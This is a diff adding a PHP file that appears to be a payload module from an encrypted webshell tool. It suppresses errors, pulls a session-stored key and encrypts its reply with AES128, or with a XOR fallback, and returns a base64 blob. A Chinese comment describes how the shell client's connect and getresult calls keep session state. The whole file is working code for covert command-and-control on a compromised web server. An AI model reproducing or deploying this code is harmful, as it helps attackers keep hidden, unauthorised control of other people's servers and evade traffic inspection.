@@ -1,0 +1,29 @@
+@error_reporting(0);
+function main($content)
+{
+	$result = array();
+	$result["status"] = base64_encode("success");
+    $result["msg"] = base64_encode($content);
+    @session_start();  //初始化session，避免connect之后直接background，后续getresult无法获取cookie
+
+    echo encrypt(json_encode($result));
+}
+
+function Encrypt($data)
+{
+ @session_start();
+    $key = $_SESSION['k'];
+	if(!extension_loaded('openssl'))
+    	{
+    		for($i=0;$i<strlen($data);$i++) {
+    			 $data[$i] = $data[$i]^$key[$i+1&15];
+    			}
+			return $data;
+    	}
+    else
+    	{
+    		return openssl_encrypt($data, "AES128", $key);
+    	}
+}
+$content="OUg1ZVNGUmQ5Mk4wTDRNT2pwN09FMWxSMG15c3p6WnlQUTZRYURORFJqcDZOUVVQMUxBUFY2c3FwS0lRcnBtb2JnTGtkUkd5YzVuTE4zWWthVXJ5bXZpZVpPSHlJOFdranJsRFlKSFk0ZmRZdjF5Nms0ZnRnbXJXMEJ6SWhOWGdkaUFHUU04cVBobEFxbEZLdHhMWExIVkRHTVV0ZnV2cWZKRm9TN0NJb2NDb0FIc0xSZllUYUcwWFpxNW16WFRlckt6TTFSOWJiVjBpeWR6cjBSYWVqZnVFYm1SWEVLTEZ2bUFHMEN6UFY3SnUyekdDRTZKYjVMSkpVMFBhN3hqZkRTNUNjMzlxdVJ2UVJGdWtOUFdlT2VCVE5aVHRVWFdWWmc2UjVjcVNza2Zid1FUQXQ3TnZMaXhTNk9aR3NRdjU0U3hTT1hpMUMwWFRRV0d3Mmh0bDUzRFhxVUVhanVpWEFZNm1qQ2R5Y1NOb0N6QzRQS1hkYnByZnc1djJtUGxVc1VMS3g5TWlublBOM25FMW1NcHVFcFlobVVhOTJydk9nNjgwNHp0RGUzc0JlS3RqY0FDUDU=";$content=base64_decode($content);
+main($content);
